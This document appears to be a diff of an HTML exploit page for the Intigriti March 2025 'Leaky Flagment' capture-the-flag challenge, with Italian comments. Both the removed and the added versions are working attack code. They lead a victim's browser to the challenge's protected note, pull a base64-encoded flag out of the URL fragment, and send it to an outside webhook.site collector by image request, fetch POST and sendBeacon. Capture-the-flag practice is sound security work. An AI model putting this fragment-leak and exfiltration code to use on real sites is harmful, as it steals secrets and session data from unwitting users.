@@ -1,20 +1,346 @@
-
 <!DOCTYPE html>
-<html><body>
-<script>
-(async () => {
-  const child = window.open('https://challenge-0325.intigriti.io/note/7f0b3267-a3af-4bba-b9ab-cdbd52242636');
-  const interval = setInterval(() => {
-    try {
-      const hash = child.location.hash;
-      if (hash.startsWith('#:')) {
-        clearInterval(interval);
-        const flag = hash.slice(3).split(':')[1];
-        fetch('https://webhook.site/cd7c7ad4-331d-4c16-bf61-ae284ce6e20a?flag=' + encodeURIComponent(flag));
-        child.close();
-      }
-    } catch {}
-  }, 500);
-})();
-</script>
-</body></html>
+<html>
+<head>
+    <title>Leaky Flagment Exploit</title>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <style>
+        body {
+            font-family: Arial, sans-serif;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            height: 100vh;
+            margin: 0;
+            background: linear-gradient(to right, #ee9ca7, #ffdde1);
+            color: #333;
+        }
+        .container {
+            background-color: white;
+            border-radius: 10px;
+            box-shadow: 0 4px 20px rgba(0,0,0,0.15);
+            padding: 30px;
+            max-width: 600px;
+            width: 90%;
+            text-align: center;
+        }
+        h1 {
+            margin-bottom: 20px;
+            color: #444;
+        }
+        .flag-container {
+            background-color: #f5f5f5;
+            border: 1px solid #ddd;
+            border-radius: 8px;
+            padding: 15px;
+            margin: 20px 0;
+            font-family: monospace;
+            text-align: center;
+            display: none;
+        }
+        .status {
+            padding: 10px;
+            margin: 20px 0;
+            border-radius: 5px;
+            font-style: italic;
+        }
+        .success {
+            background-color: #d4edda;
+            color: #155724;
+        }
+        .info {
+            background-color: #d1ecf1;
+            color: #0c5460;
+        }
+        .error {
+            background-color: #f8d7da;
+            color: #721c24;
+        }
+        .button {
+            background-color: #ee9ca7;
+            color: white;
+            border: none;
+            padding: 12px 24px;
+            border-radius: 5px;
+            cursor: pointer;
+            font-size: 16px;
+            transition: background-color 0.3s;
+            margin-top: 20px;
+        }
+        .button:hover {
+            background-color: #e67c8f;
+        }
+        .author {
+            font-size: 12px;
+            margin-top: 30px;
+            color: #666;
+        }
+        .log {
+            max-height: 150px;
+            overflow-y: auto;
+            background-color: #f8f9fa;
+            border: 1px solid #eee;
+            border-radius: 5px;
+            padding: 10px;
+            margin: 20px 0;
+            text-align: left;
+            font-family: monospace;
+            font-size: 12px;
+            display: none;
+        }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <h1>Leaky Flagment Exploit</h1>
+        <p>Questa pagina dimostra la vulnerabilità di XSS nella challenge "Leaky Flagment" di Intigriti.</p>
+        
+        <div id="statusMessage" class="status info">In attesa di avviare l'exploit...</div>
+        
+        <div id="flagContainer" class="flag-container">
+            <div>Flag trovata:</div>
+            <div id="flagValue"></div>
+        </div>
+        
+        <div id="log" class="log"></div>
+        
+        <button id="startButton" class="button">Avvia Exploit</button>
+        
+        <div class="author">Creato per la challenge Intigriti del Marzo 2025</div>
+    </div>
+
+    <script>
+        // Variabili di stato
+        let attackExecuted = false;
+        let flagSent = false;
+        
+        // Elementi DOM
+        const statusMessage = document.getElementById('statusMessage');
+        const flagContainer = document.getElementById('flagContainer');
+        const flagValue = document.getElementById('flagValue');
+        const startButton = document.getElementById('startButton');
+        const logContainer = document.getElementById('log');
+        
+        // URL del webhook dove inviare la flag
+        const webhookUrl = 'https://webhook.site/cd7c7ad4-331d-4c16-bf61-ae284ce6e20a';
+
+        // Aggiunge un messaggio al log
+        function addToLog(message, isError = false) {
+            logContainer.style.display = 'block';
+            const logEntry = document.createElement('div');
+            logEntry.textContent = `[${new Date().toLocaleTimeString()}] ${message}`;
+            if (isError) {
+                logEntry.style.color = '#dc3545';
+            }
+            logContainer.appendChild(logEntry);
+            logContainer.scrollTop = logContainer.scrollHeight;
+            console.log(message);
+        }
+
+        // Aggiorna lo stato visibile
+        function updateStatus(message, type = 'info') {
+            statusMessage.textContent = message;
+            statusMessage.className = `status ${type}`;
+            addToLog(message, type === 'error');
+        }
+
+        // Funzione principale che avvia l'exploit
+        function startExploit() {
+            if (attackExecuted) return;
+            attackExecuted = true;
+            
+            // Disabilita il pulsante
+            startButton.disabled = true;
+            
+            // Aggiorna lo stato
+            updateStatus('Avvio dell\'exploit...', 'info');
+            
+            // Controlla prima se c'è già un flag nell'URL (in caso di reindirizzamento)
+            if (checkCurrentUrlForFlag()) {
+                return; // Flag già trovata, non procedere oltre
+            }
+            
+            // Altrimenti, reindirizza alla nota protetta
+            setTimeout(() => {
+                updateStatus('Reindirizzamento alla pagina della nota protetta...', 'info');
+                
+                try {
+                    window.location.href = 'https://challenge-0325.intigriti.io/view_protected_note?id=aaaaaaaa-aaaa-aaaa-aaaa-aaaaaaaaaaaa';
+                } catch (e) {
+                    updateStatus('Errore durante il reindirizzamento: ' + e.message, 'error');
+                    startButton.disabled = false;
+                }
+            }, 1000);
+        }
+
+        // Estrae e processa il flag dal frammento dell'URL
+        function extractAndSendFlag(hash) {
+            if (flagSent) return false;
+            
+            updateStatus('Analisi dei dati nell\'URL...', 'info');
+            addToLog('Hash trovato: ' + hash);
+            
+            try {
+                // Estrae la parte dopo :~:
+                const colonTildeColonIndex = hash.indexOf(':~:');
+                if (colonTildeColonIndex === -1) {
+                    addToLog('Pattern ":~:" non trovato nell\'hash', true);
+                    if (hash.includes(':')) {
+                        addToLog('Hash contiene ":" ma non nel formato previsto, tentativo alternativo...', true);
+                        const parts = hash.split(':');
+                        if (parts.length >= 2) {
+                            const possibleBase64 = parts[parts.length - 1];
+                            processBase64Data(possibleBase64);
+                        }
+                    }
+                    return false;
+                }
+                
+                const base64Part = hash.substring(colonTildeColonIndex + 3);
+                addToLog('Parte base64 estratta: ' + base64Part);
+                
+                return processBase64Data(base64Part);
+            } catch (e) {
+                updateStatus('Errore nell\'elaborazione dell\'hash: ' + e.message, 'error');
+                addToLog('Stack trace: ' + e.stack, true);
+                return false;
+            }
+        }
+        
+        // Processa i dati base64 e cerca la flag
+        function processBase64Data(base64Data) {
+            try {
+                // Decodifica la stringa base64
+                const decoded = atob(base64Data);
+                addToLog('Decodificato: ' + decoded);
+                
+                // Cerca il pattern adminX:FLAG
+                const colonIndex = decoded.indexOf(':');
+                if (colonIndex === -1) {
+                    addToLog('Pattern ":" non trovato nei dati decodificati', true);
+                    return false;
+                }
+                
+                // Estrae la parte dopo il ":"
+                const flag = decoded.substring(colonIndex + 1);
+                
+                // Verifica che sembri una flag valida (INTIGRITI{...})
+                if (!flag || !flag.includes('INTIGRITI{')) {
+                    addToLog('Flag non valida estratta: ' + flag, true);
+                    return false;
+                }
+                
+                // Abbiamo trovato la flag!
+                displayFlag(flag);
+                sendFlagToWebhook(flag);
+                return true;
+            } catch (e) {
+                updateStatus('Errore nella decodifica base64: ' + e.message, 'error');
+                return false;
+            }
+        }
+        
+        // Mostra la flag nell'interfaccia
+        function displayFlag(flag) {
+            flagValue.textContent = flag;
+            flagContainer.style.display = 'block';
+            updateStatus('FLAG trovata con successo!', 'success');
+        }
+
+        // Invia la flag al webhook
+        function sendFlagToWebhook(flag) {
+            if (flagSent) return;
+            flagSent = true;
+            
+            updateStatus('Invio della FLAG al webhook...', 'info');
+            
+            // Metodo 1: Immagine (funziona anche con restrizioni CORS)
+            try {
+                const img = new Image();
+                img.src = `${webhookUrl}?flag=${encodeURIComponent(flag)}&method=img&time=${Date.now()}`;
+                img.style.display = 'none';
+                document.body.appendChild(img);
+                addToLog('FLAG inviata tramite immagine');
+            } catch (e) {
+                addToLog('Errore nell\'invio tramite immagine: ' + e.message, true);
+            }
+            
+            // Metodo 2: Fetch API
+            try {
+                fetch(webhookUrl, {
+                    method: 'POST',
+                    headers: {
+                        'Content-Type': 'application/json'
+                    },
+                    body: JSON.stringify({ 
+                        flag: flag,
+                        method: 'fetch',
+                        userAgent: navigator.userAgent,
+                        timestamp: new Date().toISOString()
+                    })
+                }).then(response => {
+                    addToLog('FLAG inviata con successo tramite fetch');
+                }).catch(error => {
+                    addToLog('Errore nell\'invio tramite fetch: ' + error.message, true);
+                });
+            } catch (e) {
+                addToLog('Errore con fetch: ' + e.message, true);
+            }
+            
+            // Metodo 3: Navigator.sendBeacon (funziona anche quando la pagina viene chiusa)
+            try {
+                if (navigator.sendBeacon) {
+                    const data = new FormData();
+                    data.append('flag', flag);
+                    data.append('method', 'beacon');
+                    data.append('timestamp', new Date().toISOString());
+                    
+                    const success = navigator.sendBeacon(webhookUrl, data);
+                    if (success) {
+                        addToLog('FLAG inviata con successo tramite beacon');
+                    } else {
+                        addToLog('Beacon inviato ma senza conferma di successo', true);
+                    }
+                } else {
+                    addToLog('SendBeacon non supportato in questo browser', true);
+                }
+            } catch (e) {
+                addToLog('Errore con sendBeacon: ' + e.message, true);
+            }
+            
+            updateStatus('FLAG inviata con successo!', 'success');
+        }
+
+        // Controlla se l'URL corrente contiene già una flag
+        function checkCurrentUrlForFlag() {
+            if (window.location.hash) {
+                addToLog('Hash trovato nell\'URL corrente');
+                return extractAndSendFlag(window.location.hash);
+            }
+            return false;
+        }
+
+        // Monitora i cambiamenti dell'hash nell'URL
+        window.addEventListener('hashchange', function() {
+            addToLog('Cambiamento hash rilevato: ' + window.location.hash);
+            extractAndSendFlag(window.location.hash);
+        });
+
+        // Inizializzazione quando la pagina viene caricata
+        window.onload = function() {
+            // Controlla se siamo già stati reindirizzati e abbiamo un hash
+            if (checkCurrentUrlForFlag()) {
+                // Flag già trovata, non fare nient'altro
+            } else if (window.location.hostname === 'challenge-0325.intigriti.io') {
+                // Siamo sul sito della challenge ma senza hash, avvia automaticamente
+                updateStatus('Pagina challenge rilevata, avvio automatico...', 'info');
+                startButton.textContent = 'Avvia nuovamente exploit';
+                startExploit();
+            } else {
+                // Siamo sulla pagina iniziale, in attesa che l'utente avvii l'exploit
+                startButton.addEventListener('click', startExploit);
+            }
+        };
+    </script>
+</body>
+</html>
